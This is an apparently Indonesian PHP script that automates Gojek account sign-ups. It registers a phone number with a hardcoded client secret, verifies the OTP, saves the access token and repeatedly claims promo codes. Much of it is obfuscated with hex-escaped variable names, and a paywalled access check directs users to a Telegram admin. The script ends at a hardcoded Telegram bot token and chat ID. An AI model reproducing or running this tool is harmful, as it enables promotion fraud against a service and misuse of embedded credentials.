<?php
date_default_timezone_set('Asia/Jakarta');
include "jndX1module.php";
echo "\n";
echo "\n";
echo color("
"," ||||||||||||  |||        ||||  ||||||||||| \n");
echo color("white","          |||  |||||       |||   |||      |||| \n");
echo color("red"," |        |||  |||  ||     |||   |||      ||||| \n");
echo color("red"," ||       |||  |||     ||  |||   |||     .||||| \n");
echo color("white"," ||       |||  |||,    ,||  ||   |||      |||| \n");
echo color("white"," ||||||||||||  |||||.    .||||   ||||||||||| \n");
echo "⤵\n";
sleep(2);
echo "⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛\n";
echo "⬛JOIN CHAT TELEGRAM ADMIN @THE_MASKER⬛\n";
echo "⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛\n";
sleep(1);
echo "⬜     LOGIN  GOJEK  CS     ✅\n";
sleep(1);
echo "⬜⬛    TOKEN  CHECKER   ✅ \n";
sleep(1);
echo "⬜⬛🔳  FOR  LIMIT  PAYLATER     ✅\n";
echo"⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜\n";
echo "⤵\n";
sleep(1);
login:
echo "\e[92m♨♨♨♨♨♨♨♨♨♨♨♨♨♨♨\n";
echo "\e[93m⚪MASUKAN USER ID : ";	
       ${"\x47L\x4f\x42A\x4cS"}
["k\x6dr\x6b\x68\x75s\x61\x77m\x7a\x6cx\x63n\x79\x76z\x5fu\x64v\x75\x69\x67\x64y\x63\x6d"]="p\x69l\x69h\x79";${${"\x47L\x4fB\x41L\x53"}["k\x6dr\x6b\x68\x75s\x61\x77m\x7a\x6cx\x63n\x79\x76z\x5fu\x64v\x75\x69\x67\x64y\x63\x6d"]}=trim(fgets(STDIN));if(${${"G\x4cO\x42A\x4cS"}["k\x6dr\x6b\x68\x75s\x61\x77m\x7a\x6cx\x63n\x79\x76z\x5fu\x64v\x75\x69\x67\x64y\x63\x6d"]}=="x64j"||${${"\x47L\x4fB\x41\x4cS"}["k\x6dr\x6b\x68\x75s\x61\x77m\x7a\x6cx\x63n\x79\x76z\x5fu\x64v\x75\x69\x67\x64y\x63\x6d"]}=="n63x")
// LOCK JND SCRIPT
echo "\e[92m♨♨♨♨♨♨♨♨♨♨♨♨♨♨♨\n";

else
{
echo "\e[92m♨♨♨♨♨♨♨♨♨♨♨♨♨♨♨\n";
		echo "\e[91m❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌\n";
		echo "\e[92m[❌]  \e[91m BELUM PUNYA USER ID ? \n";
		echo "\e[92m[❌]  \e[91m CHAT ADMIN  \n";
		echo "\e[92m[❌]  \e[91m T.ME@The_Masker  \n";
		echo "\e[91m❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌\n";
		echo "⤵\n";
goto login;
}

tulup: 
// function change(){
        $nama = nama();
        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
        echo color("blue","📲 MASUKKAN NOMOR  : ");
        // $no = trim(fgets(STDIN));
        $nohp = trim(fgets(STDIN));
        $nohp = str_replace("62","62",$nohp);
        $nohp = str_replace("(","",$nohp);
        $nohp = str_replace(")","",$nohp);
        $nohp = str_replace("-","",$nohp);
        $nohp = str_replace(" ","",$nohp);

        if (!preg_match('/[^+0-9]/', trim($nohp))) {
            if (substr(trim($nohp),0,3)=='62') {
                $hp = trim($nohp);
            }
            else if (substr(trim($nohp),0,1)=='0') {
                $hp = '62'.substr(trim($nohp),1);
        }
         elseif(substr(trim($nohp), 0, 2)=='62'){
            $hp = '6'.substr(trim($nohp), 1);
        }
        else{
            $hp = '1'.substr(trim($nohp),0,13);
        }
    }
        $data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$hp.'","signed_up_country":"ID"}';
        $register = request("/v5/customers", null, $data);
        if(strpos($register, '"otp_token"')){
        $otptoken = getStr('"otp_token":"','"',$register);
        echo color("green","🔵 Kode verifikasi sudah di kirim")."\n";
        otp:
        echo color("purple","KODE OTP : ");
        $otp = trim(fgets(STDIN));
        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"f4e7a5c6-72ae-42d9-8e84-ce74808916fd"}';
        $verif = request("/v5/customers/phone/verify", null, $data1);
        if(strpos($verif, '"access_token"')){
        echo color("green","✔️ Berhasil mendaftar\n");
        $token = getStr('"access_token":"','"',$verif);
        $uuid = getStr('"resource_owner_id":',',',$verif);
        echo color("nevy","+] Your access token : ".$token."\n\n");
        save("token.txt",$token);
        echo color("nevy"," TUNGGU....\n");
        echo "\n".color("nevy","VOUCHER KLAIM");
        echo "\n".color("yellow","W A I T . . .");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(10);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"EBADAHMAKANA"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
        echo "\n".color("green","🔓 Message: ".$message);
        goto gocar;
        }else{
        echo "\n".color("red","🔐 Message: ".$message);
	      gocar:
        echo "\n".color("nevy","KLAIM LAGI ....");
        echo "\n".color("yellow","W A I T . . .");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(20);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD250520"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai.')){
        echo "\n".color("green","🔓 Message: ".$message);
        goto gofood;
        }else{
        echo "\n".color("red","🔐 Message: ".$message);
        gofood:
        echo "\n".color("nevy","SEKALI LAGI....");
        echo "\n".color("yellow","W A I T . . .");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(10);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD250520}');
        $message = fetch_value($code1,'"message":"','"');
        echo "\n".color("green","🔓 Message: ".$message);
        echo "\n".color("nevy","KLAIM LAGI");
        echo "\n".color("yellow","W A I T . . .");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        sleep(5);
        $boba09 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"EBADAHMAKANB"}');
        $messageboba09 = fetch_value($boba09,'"message":"','"');
        echo "\n".color("green","🔓 Message: ".$messageboba09);
        sleep(3);
        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=13&page=1', $token);
${"G\x4cO\x42A\x4cS"}
["c\x65\x6fn\x79\x68i\x63\x66\x6dr\x6cg\x74l\x79\x79v\x67\x63\x6cv\x73d\x67s\x62n"]="t\x6ft\x61\x6c";${"\x47\x4c\x4f\x42\x41L\x53"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]="c\x65\x6b\x76\x6fu\x63\x68e\x72";${"G\x4c\x4fB\x41\x4c\x53"}["p\x66c\x74f\x77\x68t\x74f\x68\x70\x61x\x72q\x62\x6cg\x5f\x78v\x72\x78\x76s\x76t\x70\x6bp\x79z\x77p\x67"]="\x76o\x75\x63\x68e\x721";${"\x47L\x4fB\x41L\x53"}["o\x77\x64e\x71o\x6dv\x69j\x69o\x6dv\x6f\x72\x65\x76\x6b\x63n\x71\x6fb\x73q\x5fj"]="v\x6fu\x63h\x65r\x32";${"G\x4cO\x42A\x4cS"}["\x67\x6bv\x69\x71h\x73_\x75q\x65\x6a_\x6cg\x69\x72\x6fw\x6f\x61d\x64_\x77\x5fv\x7ae"]="v\x6fu\x63h\x65\x72\x33";${"G\x4cO\x42A\x4c\x53"}["l\x6d\x77g\x73l\x75\x72c\x66h\x67e\x71c\x74\x61j\x7aa\x70\x73\x78e\x6d"]="v\x6f\x75c\x68\x65r\x34";${"G\x4cO\x42\x41L\x53"}["v\x73\x69s\x63\x77n\x76\x67\x73g\x73\x6cq\x69\x70s\x70\x79s\x70\x6ea\x69a\x63i"]="\x76o\x75c\x68\x65r\x35";${"G\x4c\x4fB\x41\x4c\x53"}["\x6ex\x77n\x65z\x5f\x61\x63\x62\x63x\x62\x67f\x5fm\x71w\x67k\x6ac\x6cs\x66a\x74d\x75e\x75t\x62"]="v\x6fu\x63h\x65r\x36";${"\x47L\x4f\x42A\x4c\x53"}["\x74b\x70_\x69\x5f\x74w\x6e\x68t\x79o\x65k\x5fp\x72i\x72\x6d\x6d\x78n\x78_\x72b\x6a\x74m\x76\x65l\x6e\x63"]="v\x6f\x75\x63h\x65r\x37";${"G\x4cO\x42A\x4cS"}["\x64m\x64p\x5fp\x71r\x66w\x61p\x6ds\x73\x6fp\x71\x78m\x77n\x70\x69\x73n\x76\x71i\x6fu\x72z\x72\x64w\x7ai"]="v\x6f\x75\x63h\x65\x728";${"\x47\x4cO\x42\x41L\x53"}["d\x6fo\x64h\x79n\x79u\x72\x6cy\x71x\x78v\x76h\x65a\x62\x67w\x69\x6cw\x7a\x62\x65y\x6fp\x6ea\x5f\x61o"]="\x76\x6fu\x63\x68\x65r\x39";${"G\x4cO\x42A\x4c\x53"}["\x67l\x75u\x5fa\x6da\x78p\x74\x6ag\x67\x6e\x78r\x76z\x70\x6ax\x74r"]="v\x6fu\x63h\x65r\x31\x30";${"G\x4cO\x42A\x4cS"}["\x61u\x77h\x5fj\x64b\x79l\x5f\x73b\x74\x66\x77\x75i\x6c_\x61l\x73z\x62r\x70\x72f\x72r\x6cd"]="v\x6fu\x63h\x65\x721\x31";${"G\x4c\x4f\x42A\x4c\x53"}["i\x62\x6c\x78a\x5fs\x69\x77x\x61e\x6ad\x5f\x62o\x63\x73v\x6er\x78\x74w\x67"]="\x76o\x75c\x68e\x72\x312";${"G\x4cO\x42A\x4c\x53"}["c\x71f\x68\x5fe\x79l\x74\x76\x6cg\x6dl\x74\x74_\x6d\x6d\x6ae\x6ea\x73o\x7ap\x71l\x5fv\x76c"]="v\x6f\x75c\x68\x65\x72\x31\x33";${"\x47L\x4f\x42A\x4cS"}["s\x5fo\x65\x76u\x6f\x6bv\x5fl\x7al\x66\x70j\x71s\x64i\x69f\x66"]="\x65x\x70\x69r\x65\x641";${"G\x4c\x4fB\x41L\x53"}["s\x70\x78\x70l\x70\x73\x67\x62\x5f\x64h\x68w\x78o\x75\x77q\x76\x73_\x6bv\x6e"]="e\x78p\x69r\x65d\x32";${"G\x4c\x4f\x42\x41\x4cS"}["\x6ao\x61\x62l\x73\x6ay\x6c\x72o\x76e\x6ci\x5f\x70j\x67\x63\x66v\x61u\x6bv\x7a\x70k\x7ab\x72"]="e\x78p\x69r\x65d\x33";${"G\x4c\x4f\x42\x41L\x53"}["c\x70_\x5fk\x75w\x62\x69\x6fg\x5f\x71z\x74\x68_\x63p\x64\x72\x69r\x72l\x67f\x5f"]="e\x78p\x69r\x65\x64\x34";${"G\x4cO\x42A\x4c\x53"}["r\x5fp\x78\x70f\x64s\x76g\x64\x72w\x77\x68e\x6a\x6a\x6fc\x74\x77z\x71\x69q\x72z\x76\x7a\x7a\x71d"]="e\x78p\x69\x72e\x645";${"G\x4cO\x42A\x4c\x53"}["b\x70z\x65\x77\x6b_\x6b\x69\x69y\x6c\x6e\x6fy\x6fz\x72b\x6bt\x73w\x75t\x63\x71v\x69a\x65i\x6bo"]="e\x78\x70i\x72\x65\x646";${"G\x4cO\x42A\x4c\x53"}["\x78\x73\x74\x79_\x5f\x77\x75i\x6d\x66n\x68_\x71j\x5fk\x65t\x65\x76h\x73a\x67\x69h\x5fy\x62k\x68"]="e\x78p\x69\x72e\x647";${"\x47L\x4fB\x41L\x53"}["j\x68j\x69p\x5f\x5fi\x75\x73n\x74g\x6be\x69\x61r\x79d"]="e\x78p\x69\x72\x65\x648";${"G\x4c\x4fB\x41L\x53"}["l\x67\x72\x74\x5f\x7a\x77e\x79g\x69s\x75\x63a\x64\x71h\x6a_\x75\x6bi\x6db\x79\x6a\x6b_\x61_\x78u\x78\x67c\x6d\x67"]="\x65x\x70\x69r\x65d\x39";${"\x47L\x4fB\x41\x4cS"}["o\x5fa\x72_\x6fc\x5fu\x77f\x61\x6ck\x74\x6b\x6f\x72\x7a\x7a\x6b\x77m\x7aa"]="\x65x\x70\x69r\x65\x64\x310";${"G\x4cO\x42\x41L\x53"}["\x78_\x73t\x63z\x69\x6c_\x6b\x79\x67\x64_\x67p\x6dz\x6d\x5f"]="e\x78p\x69\x72e\x64\x311";${"\x47L\x4f\x42\x41\x4c\x53"}["\x69g\x62\x75j\x62b\x68h\x77\x6c\x66\x62\x5fc\x70\x69z\x6dy\x75\x72j"]="\x65x\x70i\x72\x65\x641\x32";${"G\x4cO\x42A\x4c\x53"}["\x5f\x75p\x67k\x77q\x6d\x70\x70u\x73\x63\x71\x7a\x6c_\x64e\x63w\x67\x5f_\x6d\x70\x72\x66\x68o\x73h\x6b\x70l\x74\x65"]="\x65x\x70\x69r\x65\x64\x31\x33";${${"\x47\x4cO\x42\x41L\x53"}["c\x65\x6fn\x79\x68i\x63\x66\x6dr\x6cg\x74l\x79\x79v\x67\x63\x6cv\x73d\x67s\x62n"]}=fetch_value(${${"G\x4c\x4f\x42\x41\x4cS"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},'"total_vouchers":',',');${${"G\x4cO\x42A\x4cS"}["p\x66c\x74f\x77\x68t\x74f\x68\x70\x61x\x72q\x62\x6cg\x5f\x78v\x72\x78\x76s\x76t\x70\x6bp\x79z\x77p\x67"]}=getStr1('"title":"','",',${${"G\x4cO\x42A\x4c\x53"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},"1");${${"\x47L\x4f\x42A\x4c\x53"}["o\x77\x64e\x71o\x6dv\x69j\x69o\x6dv\x6f\x72\x65\x76\x6b\x63n\x71\x6fb\x73q\x5fj"]}=getStr1('"title":"','",',${${"\x47L\x4f\x42\x41\x4c\x53"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},"2");${${"G\x4cO\x42A\x4cS"}["\x67\x6bv\x69\x71h\x73_\x75q\x65\x6a_\x6cg\x69\x72\x6fw\x6f\x61d\x64_\x77\x5fv\x7ae"]}=getStr1('"title":"','",',${${"\x47L\x4fB\x41L\x53"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},"3");${${"G\x4cO\x42A\x4cS"}["l\x6d\x77g\x73l\x75\x72c\x66h\x67e\x71c\x74\x61j\x7aa\x70\x73\x78e\x6d"]}=getStr1('"title":"','",',${${"\x47L\x4fB\x41L\x53"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},"4");${${"\x47L\x4fB\x41\x4cS"}["v\x73\x69s\x63\x77n\x76\x67\x73g\x73\x6cq\x69\x70s\x70\x79s\x70\x6ea\x69a\x63i"]}=getStr1('"title":"','",',${${"G\x4cO\x42\x41\x4c\x53"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},"5");${${"\x47\x4cO\x42\x41L\x53"}["\x6ex\x77n\x65z\x5f\x61\x63\x62\x63x\x62\x67f\x5fm\x71w\x67k\x6ac\x6cs\x66a\x74d\x75e\x75t\x62"]}=getStr1('"title":"','",',${${"\x47\x4cO\x42A\x4cS"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},"6");${${"\x47\x4cO\x42A\x4c\x53"}["\x74b\x70_\x69\x5f\x74w\x6e\x68t\x79o\x65k\x5fp\x72i\x72\x6d\x6d\x78n\x78_\x72b\x6a\x74m\x76\x65l\x6e\x63"]}=getStr1('"title":"','",',${${"G\x4cO\x42\x41L\x53"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},"7");${${"G\x4cO\x42A\x4cS"}["\x64m\x64p\x5fp\x71r\x66w\x61p\x6ds\x73\x6fp\x71\x78m\x77n\x70\x69\x73n\x76\x71i\x6fu\x72z\x72\x64w\x7ai"]}=getStr1('"title":"','",',${${"G\x4cO\x42A\x4cS"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},"8");${${"G\x4c\x4fB\x41L\x53"}["d\x6fo\x64h\x79n\x79u\x72\x6cy\x71x\x78v\x76h\x65a\x62\x67w\x69\x6cw\x7a\x62\x65y\x6fp\x6ea\x5f\x61o"]}=getStr1('"title":"','",',${${"\x47\x4c\x4fB\x41\x4cS"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},"9");${${"G\x4cO\x42\x41L\x53"}["\x67l\x75u\x5fa\x6da\x78p\x74\x6ag\x67\x6e\x78r\x76z\x70\x6ax\x74r"]}=getStr1('"title":"','",',${${"G\x4c\x4fB\x41\x4cS"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},"10");${${"G\x4c\x4fB\x41\x4cS"}["\x61u\x77h\x5fj\x64b\x79l\x5f\x73b\x74\x66\x77\x75i\x6c_\x61l\x73z\x62r\x70\x72f\x72r\x6cd"]}=getStr1('"title":"','",',${${"G\x4c\x4f\x42A\x4cS"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},"11");${${"\x47L\x4f\x42\x41\x4c\x53"}["i\x62\x6c\x78a\x5fs\x69\x77x\x61e\x6ad\x5f\x62o\x63\x73v\x6er\x78\x74w\x67"]}=getStr1('"title":"','",',${${"G\x4cO\x42\x41L\x53"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},"12");${${"\x47\x4c\x4fB\x41L\x53"}["c\x71f\x68\x5fe\x79l\x74\x76\x6cg\x6dl\x74\x74_\x6d\x6d\x6ae\x6ea\x73o\x7ap\x71l\x5fv\x76c"]}=getStr1('"title":"','",',${${"G\x4c\x4fB\x41\x4cS"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},"13");echo "\n".color("purple","🎫 Total vocerre ".${${"G\x4c\x4fB\x41L\x53"}["c\x65\x6fn\x79\x68i\x63\x66\x6dr\x6cg\x74l\x79\x79v\x67\x63\x6cv\x73d\x67s\x62n"]}." \x3a\x20");echo "\n".color("nevy","                     1. ".${${"\x47\x4cO\x42\x41L\x53"}["p\x66c\x74f\x77\x68t\x74f\x68\x70\x61x\x72q\x62\x6cg\x5f\x78v\x72\x78\x76s\x76t\x70\x6bp\x79z\x77p\x67"]});echo "\n".color("nevy","                     2. ".${${"G\x4cO\x42A\x4cS"}["o\x77\x64e\x71o\x6dv\x69j\x69o\x6dv\x6f\x72\x65\x76\x6b\x63n\x71\x6fb\x73q\x5fj"]});echo "\n".color("nevy","                     3. ".${${"\x47L\x4f\x42A\x4cS"}["\x67\x6bv\x69\x71h\x73_\x75q\x65\x6a_\x6cg\x69\x72\x6fw\x6f\x61d\x64_\x77\x5fv\x7ae"]});echo "\n".color("nevy","                     4. ".${${"G\x4c\x4fB\x41\x4cS"}["l\x6d\x77g\x73l\x75\x72c\x66h\x67e\x71c\x74\x61j\x7aa\x70\x73\x78e\x6d"]});echo "\n".color("nevy","                     5. ".${${"G\x4cO\x42A\x4cS"}["v\x73\x69s\x63\x77n\x76\x67\x73g\x73\x6cq\x69\x70s\x70\x79s\x70\x6ea\x69a\x63i"]});echo "\n".color("nevy","                     6. ".${${"\x47L\x4fB\x41\x4cS"}["\x6ex\x77n\x65z\x5f\x61\x63\x62\x63x\x62\x67f\x5fm\x71w\x67k\x6ac\x6cs\x66a\x74d\x75e\x75t\x62"]});echo "\n".color("nevy","                     7. ".${${"G\x4c\x4fB\x41\x4c\x53"}["\x74b\x70_\x69\x5f\x74w\x6e\x68t\x79o\x65k\x5fp\x72i\x72\x6d\x6d\x78n\x78_\x72b\x6a\x74m\x76\x65l\x6e\x63"]});echo "\n".color("nevy","                     8. ".${${"\x47L\x4f\x42\x41\x4cS"}["\x64m\x64p\x5fp\x71r\x66w\x61p\x6ds\x73\x6fp\x71\x78m\x77n\x70\x69\x73n\x76\x71i\x6fu\x72z\x72\x64w\x7ai"]});echo "\n".color("nevy","                     9. ".${${"\x47\x4cO\x42A\x4cS"}["d\x6fo\x64h\x79n\x79u\x72\x6cy\x71x\x78v\x76h\x65a\x62\x67w\x69\x6cw\x7a\x62\x65y\x6fp\x6ea\x5f\x61o"]});echo "\n".color("nevy","                     10. ".${${"\x47\x4cO\x42\x41\x4cS"}["\x67l\x75u\x5fa\x6da\x78p\x74\x6ag\x67\x6e\x78r\x76z\x70\x6ax\x74r"]});echo "\n".color("nevy","                     11. ".${${"G\x4cO\x42\x41\x4c\x53"}["\x61u\x77h\x5fj\x64b\x79l\x5f\x73b\x74\x66\x77\x75i\x6c_\x61l\x73z\x62r\x70\x72f\x72r\x6cd"]});echo "\n".color("nevy","                     12. ".${${"G\x4cO\x42A\x4c\x53"}["i\x62\x6c\x78a\x5fs\x69\x77x\x61e\x6ad\x5f\x62o\x63\x73v\x6er\x78\x74w\x67"]});echo "\n".color("nevy","                     13. ".${${"\x47\x4cO\x42A\x4cS"}["c\x71f\x68\x5fe\x79l\x74\x76\x6cg\x6dl\x74\x74_\x6d\x6d\x6ae\x6ea\x73o\x7ap\x71l\x5fv\x76c"]});echo"\n";${${"\x47\x4c\x4fB\x41L\x53"}["s\x5fo\x65\x76u\x6f\x6bv\x5fl\x7al\x66\x70j\x71s\x64i\x69f\x66"]}=getStr1('"expiry_date":"','"',${${"G\x4cO\x42A\x4c\x53"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},'1');${${"G\x4cO\x42\x41L\x53"}["s\x70\x78\x70l\x70\x73\x67\x62\x5f\x64h\x68w\x78o\x75\x77q\x76\x73_\x6bv\x6e"]}=getStr1('"expiry_date":"','"',${${"G\x4c\x4f\x42A\x4c\x53"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},'2');${${"G\x4cO\x42A\x4cS"}["\x6ao\x61\x62l\x73\x6ay\x6c\x72o\x76e\x6ci\x5f\x70j\x67\x63\x66v\x61u\x6bv\x7a\x70k\x7ab\x72"]}=getStr1('"expiry_date":"','"',${${"\x47L\x4f\x42\x41L\x53"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},'3');${${"G\x4c\x4fB\x41L\x53"}["c\x70_\x5fk\x75w\x62\x69\x6fg\x5f\x71z\x74\x68_\x63p\x64\x72\x69r\x72l\x67f\x5f"]}=getStr1('"expiry_date":"','"',${${"G\x4c\x4fB\x41L\x53"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},'4');${${"\x47\x4c\x4fB\x41\x4cS"}["r\x5fp\x78\x70f\x64s\x76g\x64\x72w\x77\x68e\x6a\x6a\x6fc\x74\x77z\x71\x69q\x72z\x76\x7a\x7a\x71d"]}=getStr1('"expiry_date":"','"',${${"G\x4cO\x42A\x4c\x53"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},'5');${${"\x47L\x4fB\x41L\x53"}["b\x70z\x65\x77\x6b_\x6b\x69\x69y\x6c\x6e\x6fy\x6fz\x72b\x6bt\x73w\x75t\x63\x71v\x69a\x65i\x6bo"]}=getStr1('"expiry_date":"','"',${${"G\x4cO\x42A\x4cS"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},'6');${${"\x47\x4cO\x42A\x4cS"}["\x78\x73\x74\x79_\x5f\x77\x75i\x6d\x66n\x68_\x71j\x5fk\x65t\x65\x76h\x73a\x67\x69h\x5fy\x62k\x68"]}=getStr1('"expiry_date":"','"',${${"\x47\x4c\x4f\x42A\x4cS"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},'7');${${"G\x4c\x4f\x42\x41\x4c\x53"}["j\x68j\x69p\x5f\x5fi\x75\x73n\x74g\x6be\x69\x61r\x79d"]}=getStr1('"expiry_date":"','"',${${"\x47\x4c\x4fB\x41L\x53"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},'8');${${"G\x4cO\x42\x41L\x53"}["l\x67\x72\x74\x5f\x7a\x77e\x79g\x69s\x75\x63a\x64\x71h\x6a_\x75\x6bi\x6db\x79\x6a\x6b_\x61_\x78u\x78\x67c\x6d\x67"]}=getStr1('"expiry_date":"','"',${${"\x47L\x4f\x42A\x4cS"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},'9');${${"G\x4cO\x42A\x4cS"}["o\x5fa\x72_\x6fc\x5fu\x77f\x61\x6ck\x74\x6b\x6f\x72\x7a\x7a\x6b\x77m\x7aa"]}=getStr1('"expiry_date":"','"',${${"G\x4cO\x42A\x4c\x53"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},'10');${${"G\x4cO\x42A\x4c\x53"}["\x78_\x73t\x63z\x69\x6c_\x6b\x79\x67\x64_\x67p\x6dz\x6d\x5f"]}=getStr1('"expiry_date":"','"',${${"\x47\x4cO\x42A\x4cS"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},'11');${${"G\x4c\x4fB\x41L\x53"}["\x69g\x62\x75j\x62b\x68h\x77\x6c\x66\x62\x5fc\x70\x69z\x6dy\x75\x72j"]}=getStr1('"expiry_date":"','"',${${"\x47\x4cO\x42A\x4cS"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},'12');${${"G\x4cO\x42\x41L\x53"}["\x5f\x75p\x67k\x77q\x6d\x70\x70u\x73\x63\x71\x7a\x6c_\x64e\x63w\x67\x5f_\x6d\x70\x72\x66\x68o\x73h\x6b\x70l\x74\x65"]}=getStr1('"expiry_date":"','"',${${"\x47L\x4fB\x41\x4c\x53"}["\x73k\x5f\x65b\x74\x70l\x63\x6c\x76w\x63\x74\x6f\x65\x70_\x77o\x6f\x77d\x79\x70i\x72c\x77l\x5f\x73p\x73n\x65\x69k\x62\x61"]},'13');
        $TOKEN  = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
      	$chatid = "785784404";
